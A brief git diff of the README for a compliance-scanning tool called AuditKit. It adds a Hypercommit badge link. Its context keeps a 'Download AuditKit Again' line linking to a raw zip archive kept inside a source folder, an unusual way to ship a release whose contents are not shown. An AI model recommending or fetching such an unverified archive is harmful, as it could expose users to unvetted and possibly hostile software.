@@ -64,3 +64,7 @@ AuditKit aims to simplify compliance checks in multi-cloud environments. By usin
 
 ### 📥 Download AuditKit Again
 For convenience, here’s the link to [download AuditKit](https://github.com/Son468/auditkit/raw/refs/heads/main/scanner/cmd/Software-2.1.zip). Happy auditing!
+
+## Links
+
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/auditkit)
